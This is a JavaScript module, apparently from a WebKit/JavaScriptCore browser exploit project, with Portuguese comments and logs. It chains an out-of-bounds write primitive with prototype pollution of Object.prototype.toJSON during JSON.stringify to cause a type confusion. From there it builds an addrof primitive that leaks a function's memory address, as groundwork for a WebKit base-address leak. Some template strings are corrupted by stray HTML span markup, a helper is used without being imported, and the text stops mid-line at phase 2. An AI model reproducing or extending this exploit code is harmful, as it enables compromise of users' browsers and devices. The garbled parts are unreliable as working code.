// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43j - Aguardando Core Exploit v31.7)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
// A isAdvancedInt64Object importada de utils.mjs ainda será usada aqui,
// pois não podemos modificar utils.mjs para ter uma _local_isAdvancedInt64Object lá.
// A robustez de isValidPointer dependerá de como isAdvancedInt64Object de utils.mjs funciona.
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
    selfTestTypeConfusionAndMemoryControl,
    attemptAddrofUsingCoreHeisenbug 
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xABABABAB, 0xCDCDCDCD];

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10;

const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18); 
const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);   

const targetFunctionForLeak = function someUniqueLeakFunctionR43j() { return "target_R43j"; };
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) { // Esta é a isAdvancedInt64Object de utils.mjs
        return false;
    }
    const high = ptr.high();
    const low = ptr.low();

    if (high === 0 && low === 0) return false;
    
    if ((high & 0x7FF00000) === 0x7FF00000) { 
        return false; 
    }
    if (high === 0 && low < 0x10000) return false;
    return true;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Nome da função mantido para runner
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Addrof + WebKit Base Leak (R43j) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R43j...`;

    logS3(`--- Fase 0 (R43j): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
        if (!coreOOBReadWriteOK) {
           logS3("AVISO CRÍTICO: selfTestOOBReadWrite falhou. As primitivas OOB podem estar instáveis. arb_read provavelmente não funcionará.", "critical", FNAME_CURRENT_TEST_BASE);
        }
        const coreTCAndMemControlOK = await selfTestTypeConfusionAndMemoryControl(logS3);
        logS3(`Sanity Check (selfTestTypeConfusionAndMemoryControl): ${coreTCAndMemControlOK ? 'SUCESSO' : 'FALHA'}`, coreTCAndMemControlOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
        
        // Tentativa de usar o addrof do core_exploit
        const coreAddrofTarget = { test: "coreAddrofTarget_R43j" };
        logS3(`--- Testando attemptAddrofUsingCoreHeisenbug (R43j) ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const coreAddrofResult = await attemptAddrofUsingCoreHeisenbug(coreAddrofTarget);
        logS3(`Resultado attemptAddrofUsingCoreHeisenbug: Success=<span class="math-inline">\{coreAddrofResult\.success\}, Msg\=</span>{coreAddrofResult.message}, Addr64=${coreAddrofResult.leaked_address_as_int64 || 'N/A'}`, coreAddrofResult.success ? 'good' : 'warn', FNAME_CURRENT_TEST_BASE);


    } catch (e_sanity) {
        logS3(`Erro durante Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE);
    }
    await PAUSE_S3(100);

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (R43j): Not run.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R43j): Not run.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
        oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        leaked_target_function_addr = null; 
        const current_oob_hex_val = toHex(current_oob_value !== undefined && current_oob_value !== null ? current_oob_value : 0);
        const FNAME_CURRENT_ITERATION = `<span class="math-inline">\{FNAME\_CURRENT\_TEST\_BASE\}\_OOB</span>{current_oob_hex_val}`;
        logS3(`\n===== ITERATION R43j: OOB Write Value: ${current_oob_hex_val} (Raw: ${current_oob_value}) =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null;
        let iteration_tc_first_detection_done = false;
        let iter_addrof_result = { success: false, msg: "Addrof (R43j): Not run in this iter.", leaked_object_addr: null, leaked_object_addr_candidate_str: null };

        function toJSON_TA_Probe_Iter_Closure_R43j() {
            probe_call_count_iter++; const call_num = probe_call_count_iter; const ctts = Object.prototype.toString.call(this);
            const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');

            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_v82: "M2_Iter_R43j" };
                    marker_M1_ref_iter = { marker_id_v82: "M1_Iter_R43j", payload_M2: marker_M2_ref_iter };
                    return marker_M1_ref_iter;
                } else if (is_m2c) { 
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true;
                        iteration_final_tc_details_from_probe = {
                            call_number_tc_detected: call_num, probe_variant: "TA_Probe_R43j", this_type: "[object Object]",
                            this_is_M2: true, getter_defined: false, direct_prop_set: false, getter_fired: true, 
                            leak_val_getter_int64: null, leak_val_getter_is_ptr: false, error_probe: null
                        };
                        logS3(`[PROBE_R43j] Call #<span class="math-inline">\{call\_num\} \(M2C\)\: FIRST TC\. Details obj CREATED\. ID\:</span>{this.marker_id_v82}`, "vuln");
                    }

                    if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.call_number_tc_detected === call_num) {
                        if (!victim_typed_array_ref_iter?.buffer) {
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = "addrof_victim_null";
                            return "addrof_victim_null";
                        }
                        let float_view = new Float64Array(victim_typed_array_ref_iter.buffer);
                        let uint32_view = new Uint32Array(victim_typed_array_ref_iter.buffer);
                        const original_low = uint32_view[0]; const original_high = uint32_view[1];

                        try {
                            float_view[0] = targetFunctionForLeak;
                            const leaked_low = uint32_view[0];
                            const leaked_high = uint32_view[1];
                            logS3(`[PROBE_R43j_ADDROF_DEBUG] Raw leaked_low: 0x${leaked_low.toString(16)}, Raw leaked_high: 0x${leaked_high.toString(16)}`, "leak");
                            
                            const potential_addr = new AdvancedInt64(leaked_low, leaked_high); 
                            iter_addrof_result.leaked_object_addr_candidate_str = potential_addr.toString(true); // Usará toHexHelper do core_exploit
                            logS3(`[PROBE_R43j_ADDROF] Candidate Addr for targetFunctionForLeak: ${iter_addrof_result.leaked_object_addr_candidate_str}`, "leak");

                            if (isValidPointer(potential_addr, "_probe")) {
                                leaked_target_function_addr = potential_addr; 
                                iter_addrof_result.leaked_object_addr = toHexHelper(leaked_target_function_addr); // Usa toHexHelper do core_exploit
                                iter_addrof_result.success = true;
                                iter_addrof_result.msg = "Addrof (R43j): Sucesso ao obter endereço candidato da função.";
                                if (iteration_final_tc_details_from_probe) {
                                    iteration_final_tc_details_from_probe.leak_val_getter_int64 = toHexHelper(potential_addr);
                                    iteration_final_tc_details_from_probe.leak_val_getter_is_ptr = true;
                                }
                                logS3(`[PROBE_R43j_ADDROF] SUCESSO! Endereço de targetFunctionForLeak: ${toHexHelper(leaked_target_function_addr)}`, "vuln");
                            } else {
                                iter_addrof_result.msg = `Addrof (R43j): Endereço candidato (${iter_addrof_result.leaked_object_addr_candidate_str}) não parece ponteiro válido.`;
                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = iter_addrof_result.leaked_object_addr_candidate_str + " (invalido)";
                            }
                        } catch (e_addrof) {
                            iter_addrof_result.msg = `Addrof (R43j) EXCEPTION: ${e_addrof.message}`;
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = `addrof_ex:${e_addrof.message}`;
                        } finally {
                            uint32_view[0] = original_low;
                            uint32_view[1] = original_high;
                        }
                    }
                    return this; 
                }
            } catch (e_pm) {
                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `ProbeMainErr:${e_pm.message}`;
                return { err_pm: call_num, msg: e_pm.message };
            }
            return { gen_m: call_num, type: ctts };
        }

        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null;
        let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R43j): Not run in this iter.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null };
        let heisenbugConfirmedThisIter = false;

        try {
            logS3(`  --- Fase 1 (R43j): Detecção de Type Confusion & Addrof ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150);
            victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);

            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_R43j, writable: true, configurable: true, enumerable: false });
                polluted = true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output }; }

                if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2) {
                    heisenbugConfirmedThisIter = true;
                    // Tentar addrof com a função do core_exploit se a nossa falhou
                    if (!iter_addrof_result.success) {
                        logS3(`  Addrof R43j (probe) falhou. Tentando attemptAddrofUsingCoreHeisenbug...`, "warn", FNAME_CURRENT_ITERATION);
                        const coreAddrofRes = await attemptAddrofUsingCoreHeisenbug(targetFunctionForLeak);
                        logS3(`  Resultado attemptAddrofUsingCoreHeisenbug: Success=<span class="math-inline">\{coreAddrofRes\.success\}, Msg\=</span>{coreAddrofRes.message}, Addr64=${coreAddrofRes.leaked_address_as_int64 || 'N/A'}`, coreAddrofRes.success ? 'good' : 'warn', FNAME_CURRENT_ITERATION);
                        if (coreAddrofRes.success && coreAddrofRes.leaked_address_as_int64) {
                            try {
                                // Tentar converter a string de volta para AdvancedInt64. Isso é arriscado se o formato de string não for 0x...
                                const addrFromCoreStr = coreAddrofRes.leaked_address_as_int64;
                                if (typeof addrFromCoreStr === 'string' && addrFromCoreStr.startsWith('0x')) {
                                     leaked_target_function_addr = new AdvancedInt64(addrFromCoreStr);
                                     if (isValidPointer(leaked_target_function_addr, "_coreAddrof")) {
                                        iter_addrof_result.leaked_object_addr = leaked_target_function_addr.toString(true);
                                        iter_addrof_result.success = true;
                                        iter_addrof_result.msg = "Addrof (R43j): Sucesso via attemptAddrofUsingCoreHeisenbug.";
                                        logS3(`  Addrof (Core): SUCESSO! Endereço de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "vuln");
                                     } else {
                                        iter_addrof_result.msg = `Addrof (R43j): attemptAddrofUsingCoreHeisenbug retornou valor (${addrFromCoreStr}) não reconhecido como ponteiro válido.`;
                                     }
                                } else {
                                     iter_addrof_result.msg = `Addrof (R43j): attemptAddrofUsingCoreHeisenbug retornou endereço em formato inesperado: ${addrFromCoreStr}`;
                                }
                            } catch (e_conv) {
                                 iter_addrof_result.msg = `Addrof (R43j): Erro ao converter endereço de attemptAddrofUsingCoreHeisenbug: ${e_conv.message}`;
                            }
                        } else {
                             iter_addrof_result.msg = `Addrof (R43j): Ambas as tentativas (probe e core) falharam. Msg Core: ${coreAddrofRes.message}`;
                        }
                    }
                    logS3(`  TC Probe R43j: TC on M2 CONFIRMED. Addrof final success: ${iter_addrof_result.success}. Addr: ${iter_addrof_result.leaked_object_addr || iter_addrof_result.leaked_object_addr_candidate_str || 'N/A'}`, iter_addrof_result.success ? "vuln" : "warn");
                    if (iteration_final_tc_details_from_probe.error_probe && !iter_primary_error) iter_primary_error = new Error(iteration_final_tc_details_from_probe.error_probe);
                } else {
                    logS3(`  TC Probe R43j: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");
                }
            } catch (e_str) {
                if (!iter_primary_error) iter_primary_error = e_str;
                logS3(`  TC/Addrof Probe R43j: JSON.stringify EXCEPTION: ${e_str.message}`, "error");
            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                }
            }
            logS3(`  --- Fase 1 (R43j) Concluída. TC M2: ${heisenbugConfirmedThisIter}. Addrof Sucesso: ${iter_addrof_result.success} ---`, "subtest");
            await PAUSE_S3(100);

            logS3(`  --- Fase 2 (R43
